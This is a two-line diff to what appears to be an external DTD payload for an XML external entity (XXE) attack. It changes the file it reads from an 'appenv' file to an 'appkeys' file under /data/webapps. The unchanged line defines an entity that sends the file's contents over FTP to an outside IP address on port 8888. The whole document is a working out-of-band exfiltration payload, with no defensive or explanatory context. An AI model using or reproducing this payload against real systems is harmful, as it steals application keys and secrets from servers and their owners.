@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///data/webapps/appenv">
+<!ENTITY % file SYSTEM "file:///data/webapps/appkeys">
 <!ENTITY % define_ftp "<!ENTITY &#37; send_ftp SYSTEM 'ftp://182.92.151.151:8888/%file;'>">
